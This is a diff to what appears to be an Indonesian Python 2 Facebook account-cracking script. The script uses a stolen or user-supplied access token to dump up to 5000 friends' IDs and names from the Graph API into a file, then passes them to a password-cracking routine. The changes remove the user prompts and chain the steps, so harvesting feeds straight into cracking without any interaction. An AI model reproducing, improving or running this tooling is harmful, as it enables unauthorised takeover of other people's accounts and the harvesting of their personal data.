@@ -114,7 +114,7 @@ def yayanxd():
         print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
         raw_input(' %s*%s tekan enter '%(O,N))
         os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
-        yayanxd()
+        publik(kontol)
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
         print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
@@ -227,9 +227,9 @@ def teman(kontol):
         os.mkdir('dump')
     except:pass
     try:
-        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
-        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
-        cin = ('dump/' + mmk + '.json').replace(' ', '_')
+        mmk = 'dmp.json'
+        asw = 5000
+        cin ='dmp.json'
         ys  = open(cin, 'w')
         for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
@@ -243,7 +243,7 @@ def teman(kontol):
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
-        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
+        __crack__().plerr()
     except (KeyError,IOError):
         os.remove(cin)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
@@ -545,12 +545,12 @@ class __crack__:
 
     def plerr(self):
         try:
-            self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
+            self.apk = 'dmp.json'
             self.id = open(self.apk).read().splitlines()
             print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
         except:
             print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,N);time.sleep(3);moch_yayan()
-        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
+        ___yayanganteng___ ='t'
         if ___yayanganteng___ in ('Y', 'y'):
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
